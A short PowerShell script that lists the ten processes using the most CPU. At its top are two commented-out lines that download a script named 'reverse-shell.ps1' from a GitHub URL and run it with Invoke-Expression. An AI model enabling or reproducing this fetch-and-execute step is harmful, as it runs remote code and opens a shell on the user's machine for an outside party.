# $ScriptFromGithHub = Invoke-WebRequest https://raw.githubusercontent.com/mephisto76/coding/reverse-shell.ps1
# Invoke-Expression $($ScriptFromGithHub.Content)


Write-Host " "
Write-Host "Here are the top 10 CPU consuming processes right now"
Write-Host " "
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10

